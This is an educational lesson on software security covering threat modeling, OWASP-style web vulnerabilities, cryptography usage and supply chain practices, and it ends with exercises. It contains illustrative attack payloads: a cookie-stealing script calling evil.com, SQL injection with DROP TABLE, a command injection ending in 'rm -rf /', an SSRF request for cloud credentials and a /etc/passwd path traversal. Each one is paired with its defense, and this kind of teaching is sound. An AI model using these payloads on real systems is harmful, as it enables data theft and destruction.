# Security

Security is not a feature you bolt on at the end — it's a property of how you design, build, and operate software. A single vulnerability can undo months of engineering work and destroy user trust overnight. This lesson covers the concepts and attacks every engineer must understand: the principles that guide secure design, the web vulnerabilities that appear on every bug bounty list, the practical cryptography you need to use correctly (not implement yourself), and the supply chain risks hiding in your dependencies. You don't need to be a security researcher, but you do need to recognize when you're making a security-relevant decision.

---

## Core Concepts

### The CIA Triad

Every security discussion starts here. The three properties you're trying to protect:

- **Confidentiality**: only authorized parties can access the data. Encryption, access controls, data classification
- **Integrity**: data hasn't been tampered with. Checksums, digital signatures, audit logs
- **Availability**: the system is accessible when needed. DDoS protection, redundancy, backups

Most security decisions involve trade-offs between these. A system encrypted at rest and in transit with strict access controls has high confidentiality — but if you lose the encryption keys, you lose availability too.

### Threat Modeling

Before writing security code, understand *what you're defending against*:

1. **Identify assets**: what data/systems are valuable? User credentials, payment data, PII, API keys
2. **Identify threats**: who might attack? External attackers, malicious insiders, automated bots, nation-state actors
3. **Identify attack surfaces**: where could they get in? Public APIs, admin panels, third-party integrations, employee laptops
4. **Assess risk**: likelihood × impact. A SQL injection on a login form (high likelihood, critical impact) ranks higher than a theoretical timing attack on a low-value endpoint
5. **Mitigate**: fix the high-risk items first

**STRIDE** is a common framework:
- **S**poofing identity (pretending to be someone else)
- **T**ampering with data
- **R**epudiation (denying actions without accountability)
- **I**nformation disclosure (data leaks)
- **D**enial of service
- **E**levation of privilege

### Authentication vs Authorization

These are different concerns, often conflated:

- **Authentication (AuthN)**: *who are you?* Verifying identity — passwords, tokens, certificates, biometrics
- **Authorization (AuthZ)**: *what can you do?* Determining permissions — roles, policies, ACLs

```
AuthN: "This request is from user alice (verified via JWT)"
AuthZ: "alice has role 'editor', which grants permission to update articles
        but NOT delete them"
```

### Principle of Least Privilege

Every user, service, and process should have the minimum permissions necessary to do its job — and no more.

- A web server doesn't need root access
- A reporting service doesn't need write access to the production database
- An API key for reading public data shouldn't have admin scope
- IAM roles should be scoped to specific resources, not `*`

**Why**: if (when) a component is compromised, the blast radius is limited to what it had access to.

### Secrets Management

Secrets (API keys, database passwords, encryption keys, certificates) need special handling:

**Don't**:
- Hard-code secrets in source code
- Commit secrets to git (even in private repos — history is forever)
- Pass secrets as command-line arguments (visible in process lists)
- Log secrets (even "temporarily for debugging")

**Do**:
- Use a secrets manager: HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager
- Inject secrets via environment variables or mounted files at runtime
- Rotate secrets regularly — if a secret is compromised, rotation limits the damage window
- Use short-lived credentials where possible (e.g., AWS STS temporary tokens)

```bash
# Bad: secret in code
DB_PASSWORD = "hunter2"

# Better: secret from environment
DB_PASSWORD = os.environ["DB_PASSWORD"]

# Best: secret from a secrets manager with automatic rotation
db_password = vault_client.read("database/creds/myapp")
```

### Key Rotation

Even if secrets aren't compromised, rotate them periodically:

- **Why**: limits the window of exposure if a secret was leaked without your knowledge
- **How**: deploy the new key, update all consumers, verify they're using the new key, revoke the old key
- **Grace period**: support both old and new keys simultaneously during transition (dual-read)
- **Automate it**: manual rotation doesn't happen. Use tools that rotate and distribute automatically

---

## Web Security

These vulnerabilities appear on the OWASP Top 10 year after year. Every web developer must understand them.

### Cross-Site Scripting (XSS)

An attacker injects malicious JavaScript that runs in other users' browsers.

**Stored XSS**: malicious script is saved in the database and served to every user who views the page:

```html
<!-- Attacker posts this as a comment -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- Every user who views the comments page executes this script -->
```

**Reflected XSS**: malicious script is part of the URL and reflected in the response:

```
https://example.com/search?q=<script>alert('xss')</script>
```

**DOM-based XSS**: the vulnerability is in client-side JavaScript that processes untrusted data:

```javascript
// Vulnerable: directly inserting URL parameter into DOM
document.getElementById('output').innerHTML = location.hash.slice(1);

// URL: https://example.com/#<img src=x onerror=alert('xss')>
```

**Defenses**:
- **Output encoding**: escape HTML entities before rendering user input (`<` → `&lt;`)
- **Content Security Policy (CSP)**: HTTP header that restricts which scripts can execute

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

- **Use framework auto-escaping**: React, Angular, and Vue escape by default. Don't use `dangerouslySetInnerHTML` / `v-html` with user input
- **HttpOnly cookies**: prevent JavaScript from accessing session cookies (mitigates cookie theft)

### Cross-Site Request Forgery (CSRF)

An attacker tricks a logged-in user's browser into making an unwanted request to a site where they're authenticated:

```html
<!-- Attacker's page -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- User's browser sends this request WITH the user's bank cookies -->
```

**Defenses**:
- **CSRF tokens**: include a random token in forms that the server validates. The attacker can't guess it
- **SameSite cookies**: control when cookies are sent with cross-origin requests

```
Set-Cookie: session=abc123; SameSite=Strict   # Never sent cross-origin
Set-Cookie: session=abc123; SameSite=Lax      # Sent on top-level navigations only
Set-Cookie: session=abc123; SameSite=None; Secure  # Always sent (opt-in, requires HTTPS)
```

- **Check the Origin/Referer header**: reject requests from unexpected origins

### SQL Injection

Untrusted input is concatenated into a SQL query, allowing the attacker to modify the query:

```python
# VULNERABLE — string concatenation
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# Attacker input: ' OR '1'='1
# Resulting query: SELECT * FROM users WHERE name = '' OR '1'='1'
# Returns ALL users

# Attacker input: '; DROP TABLE users; --
# Resulting query: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
# Deletes the table
```

**Defense — parameterized queries (prepared statements)**:

```python
# SAFE — parameterized query
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))

# The database treats user_input as DATA, never as SQL code
# Even if user_input is "'; DROP TABLE users; --", it's just a string value
```

**This is a solved problem**. There is no excuse for SQL injection in new code. Use parameterized queries. Always.

### Command Injection

Same principle as SQL injection, but with OS commands:

```python
# VULNERABLE
os.system(f"ping {user_input}")

# Attacker input: 8.8.8.8; rm -rf /
# Resulting command: ping 8.8.8.8; rm -rf /

# SAFE — use subprocess with argument list (no shell interpretation)
subprocess.run(["ping", "-c", "4", user_input], shell=False)
```

### Server-Side Request Forgery (SSRF)

An attacker tricks the server into making requests to internal resources:

```
# The app fetches a URL provided by the user (e.g., "preview this link")
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# The server fetches the AWS metadata endpoint, leaking IAM credentials
```

**Defenses**:
- Validate and whitelist allowed URL schemes (http/https only) and domains
- Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost)
- Use a network-level firewall to prevent the application server from reaching internal services it shouldn't

### Path Traversal

Attacker manipulates file paths to access files outside the intended directory:

```python
# VULNERABLE
filename = request.args['file']
return open(f"/uploads/{filename}").read()

# Attacker: ?file=../../../etc/passwd
# Opens: /uploads/../../../etc/passwd → /etc/passwd

# SAFE — resolve the path and verify it's within the allowed directory
import os
base = os.path.realpath("/uploads")
full_path = os.path.realpath(os.path.join(base, filename))
if not full_path.startswith(base):
    raise SecurityError("Path traversal detected")
```

### Deserialization Attacks

Untrusted data is deserialized into objects, potentially executing arbitrary code:

```python
# DANGEROUS — never unpickle untrusted data
import pickle
user_data = pickle.loads(request.body)  # Attacker controls request.body → RCE

# SAFE — use data-only formats
import json
user_data = json.loads(request.body)  # JSON can't contain executable code
```

**Rule**: never deserialize untrusted data with formats that support code execution (Python pickle, Java ObjectInputStream, PHP unserialize, YAML with custom tags).

### Clickjacking

An attacker embeds your site in an invisible iframe and tricks users into clicking on it:

```html
<!-- Attacker's page -->
<iframe src="https://bank.com/transfer" style="opacity: 0; position: absolute;"></iframe>
<button style="position: absolute; top: 200px;">Click here to win a prize!</button>
<!-- User clicks "win a prize" but actually clicks "confirm transfer" in the iframe -->
```

**Defense**: `X-Frame-Options: DENY` header, or `Content-Security-Policy: frame-ancestors 'none'`

### CORS Misconceptions

**CORS (Cross-Origin Resource Sharing)** does NOT protect your API — it protects your *users' browsers* from malicious scripts on other origins reading your API's responses.

Common mistakes:
- Setting `Access-Control-Allow-Origin: *` on an API that uses cookies for auth (the browser won't send cookies with `*`, but the intent reveals confusion)
- Reflecting the `Origin` header back as `Access-Control-Allow-Origin` without validation (defeats the purpose entirely)
- Thinking CORS prevents the request from being made (it doesn't — the request is made; the *response* is blocked from the script)

### Session Management and Token Storage

**Session tokens** (server-side sessions):
- Server stores session state, client gets an opaque session ID in a cookie
- **Secure cookie flags**: `HttpOnly` (no JS access), `Secure` (HTTPS only), `SameSite`, short expiration

**JWTs** (JSON Web Tokens):
- Self-contained tokens with claims, signed by the server
- Stateless: server doesn't need to look up a session store
- **Problem**: can't be revoked easily (they're valid until expiry). Mitigations: short TTL + refresh tokens, or a token blacklist (which reintroduces statefulness)

**Where to store tokens in the browser**:

| Location | XSS Risk | CSRF Risk | Notes |
|----------|----------|-----------|-------|
| HttpOnly cookie | Protected | Vulnerable (use CSRF token) | Best for most web apps |
| localStorage | Vulnerable (any JS can read it) | Protected (not sent automatically) | Avoid for sensitive tokens |
| In-memory (JS variable) | Safer (cleared on page close) | Protected | Lost on refresh; OK for SPAs with refresh token flow |

---

## Practical Cryptography

You don't need to implement cryptographic algorithms. You need to use the right ones correctly.

### Hash vs HMAC vs Encryption

These serve different purposes — don't mix them up:

- **Hash** (SHA-256): one-way function. Input → fixed-size output. No key. Used for integrity checks, fingerprinting
  - Same input always produces same output
  - Can't reverse it to get the input
  - Vulnerable to brute-force if the input space is small

- **HMAC** (Hash-based Message Authentication Code): hash with a secret key. Proves both integrity AND authenticity
  - `HMAC(key, message)` → only someone with the key can produce/verify
  - Used for API signatures, webhook verification, token signing

- **Encryption**: reversible transformation using a key. Protects confidentiality
  - Symmetric: same key encrypts and decrypts (AES)
  - Asymmetric: public key encrypts, private key decrypts (RSA, ECC)

```
Hash:       SHA-256("hello") → 2cf24dba...  (anyone can compute)
HMAC:       HMAC-SHA256(key, "hello") → 7f5b3c...  (only key holder can compute)
Encrypt:    AES-256(key, "hello") → ciphertext  (only key holder can decrypt)
```

### Symmetric Encryption (AES)

Same key for encryption and decryption. Fast, used for bulk data.

- **AES-256-GCM** is the modern standard: provides both encryption and authentication (detects tampering)
- Never use ECB mode (encrypts identical blocks identically — leaks patterns)
- Always use a unique **nonce/IV** per encryption operation (never reuse with the same key)

### Asymmetric Encryption (RSA, ECC)

Different keys for encryption and decryption. Slower, used for key exchange and signatures.

- **RSA**: the classic. 2048-bit minimum, 4096-bit recommended. Being phased out in favor of ECC for performance
- **ECC** (Elliptic Curve Cryptography): same security with smaller keys (256-bit ECC ≈ 3072-bit RSA)
- **Use case**: TLS handshake (exchange a symmetric key using asymmetric crypto, then use the symmetric key for speed)

### Digital Signatures

Prove that a message was created by a specific party and hasn't been modified:

```
Signing:    signature = Sign(private_key, message)
Verifying:  valid = Verify(public_key, message, signature)
```

- Anyone with the public key can verify, but only the private key holder can sign
- Used for: code signing, TLS certificates, JWT signing, software updates

### Password Hashing

Regular hashing (SHA-256) is NOT sufficient for passwords — it's too fast. Attackers can hash billions of guesses per second.

**Use purpose-built password hashing functions**:

| Algorithm | Notes |
|-----------|-------|
| **Argon2id** | Winner of the Password Hashing Competition (2015). Best choice for new systems. Configurable memory, CPU, and parallelism costs |
| **bcrypt** | Mature, widely supported. 72-byte password limit. Good default |
| **scrypt** | Memory-hard (makes GPU attacks expensive). Less adoption than bcrypt/Argon2 |

```python
# Python example with bcrypt
import bcrypt

# Hashing (during registration)
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)              # 2^12 iterations
hashed = bcrypt.hashpw(password, salt)        # Includes salt in output

# Verification (during login)
if bcrypt.checkpw(password, hashed):
    print("Login successful")
```

**Key properties**:
- **Salted**: each password gets a random salt, so identical passwords produce different hashes
- **Slow by design**: configurable work factor makes brute-force expensive (increase over time as hardware improves)
- **Never store plaintext passwords**. Not even encrypted. If the encryption key leaks, all passwords are compromised

### Don't Roll Your Own Crypto

This is the most important rule in practical cryptography:

- Don't invent your own encryption scheme
- Don't implement AES yourself
- Don't create your own authentication protocol
- Don't use XOR as "encryption"
- Don't "obfuscate" data and call it encrypted

Use established libraries: libsodium/NaCl, OpenSSL, your language's standard crypto library. If a security expert hasn't audited the implementation, don't use it for anything that matters.

---

## Supply Chain Security

Your application is built on thousands of dependencies. Each one is a potential attack vector.

### Dependency Auditing

Every dependency you add is code you're choosing to trust:

```bash
# Check for known vulnerabilities
npm audit                          # Node.js
pip-audit                          # Python
cargo audit                        # Rust
dotnet list package --vulnerable   # .NET

# GitHub Dependabot / Renovate Bot: automated PRs for vulnerable dependencies
```

**Best practices**:
- Run audits in CI — fail the build on critical vulnerabilities
- Review what you're installing: read the package, check maintainer reputation, look at download counts
- Minimize your dependency tree. Every dependency is attack surface
- Pin major versions, use lockfiles, update deliberately

### Lockfiles

Lockfiles (`package-lock.json`, `poetry.lock`, `Cargo.lock`, `go.sum`) pin exact dependency versions and their integrity hashes:

```json
// package-lock.json (excerpt)
{
  "lodash": {
    "version": "4.17.21",
    "integrity": "sha512-WjKPNJF79dtJAVn...=="
  }
}
```

- **Always commit lockfiles** to version control
- The integrity hash ensures you get the exact same artifact — even if the package registry is compromised, a tampered package won't match the hash
- Without a lockfile, `npm install` might install a different (potentially malicious) version on the CI server vs your laptop

### SBOMs (Software Bill of Materials)

An SBOM is a machine-readable inventory of every component in your software:

- Lists every dependency, version, license, and supplier
- Enables rapid response when a vulnerability is disclosed (e.g., Log4Shell: "which of our services use Log4j?")
- Formats: SPDX, CycloneDX
- Increasingly required for government contracts and regulated industries

### Container Image Provenance

Container images have their own supply chain risks:

- **Use minimal base images**: `distroless`, `alpine`, or `scratch` — fewer packages = fewer vulnerabilities
- **Pin image digests**, not just tags: `nginx:1.25@sha256:abc123...` — tags can be overwritten

```dockerfile
# Bad: mutable tag, anyone can push a new "latest"
FROM node:latest

# Better: pinned version
FROM node:20.11-slim

# Best: pinned digest (immutable reference)
FROM node:20.11-slim@sha256:a1b2c3d4e5f6...
```

- **Scan images for vulnerabilities**: Trivy, Grype, Snyk
- **Sign images**: Sigstore/cosign lets you cryptographically verify that an image was built by your CI pipeline
- **Don't run as root in containers**: use a non-root `USER` directive

---

## Exercises

1. **Threat Model**: pick a system you've worked on (or a simple web app: login, profile, file upload). Identify the top 5 threats using STRIDE. For each, describe the attack and one mitigation.

2. **XSS Hunt**: the following code renders user-generated content. Identify the vulnerability and fix it:

```javascript
app.get('/profile', (req, res) => {
  const name = req.query.name;
  res.send(`<h1>Welcome, ${name}!</h1>`);
});
```

3. **SQL Injection Fix**: convert this vulnerable query to use parameterized statements in your language of choice:

```python
query = f"SELECT * FROM products WHERE category = '{category}' AND price < {max_price}"
```

4. **Token Storage Decision**: you're building a banking SPA. The auth server issues JWTs with a 15-minute TTL and refresh tokens with a 7-day TTL. Where would you store each? What are the trade-offs? What happens when the access token expires?

5. **Dependency Audit**: run `npm audit` (or equivalent) on a project you maintain. How many vulnerabilities are reported? Categorize them by severity. For critical ones, is there a patched version available? What's your upgrade path?

6. **Password Hashing**: you find this in a legacy codebase. Explain every problem with it and write the corrected version:

```python
import hashlib
def store_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

---

## Recommended Resources

- **OWASP Top 10** (owasp.org/www-project-top-ten/) — the canonical list of web security risks, updated periodically. Every web developer should read this at least once
- **PortSwigger Web Security Academy** (portswigger.net/web-security) — free, hands-on labs covering every vulnerability in this lesson. The best practical resource for learning web security
- **Practical Cryptography for Developers** (cryptobook.nakov.com) — clear explanations of hashing, encryption, signatures, and key exchange with code examples. Focuses on correct usage, not implementation
- **The Tangled Web** by Michal Zalewski — deep dive into browser security model, same-origin policy, and why web security is so hard
- **Threat Modeling: Designing for Security** by Adam Shostack — systematic approach to thinking about security during design, not after deployment
- **NIST Cybersecurity Framework** — provides a structure for organizations to assess and improve their security posture. Useful for understanding security at an organizational level
- **Have I Been Pwned** (haveibeenpwned.com) — Troy Hunt's breach database. A practical reminder of why password security matters. Also provides an API for checking compromised passwords
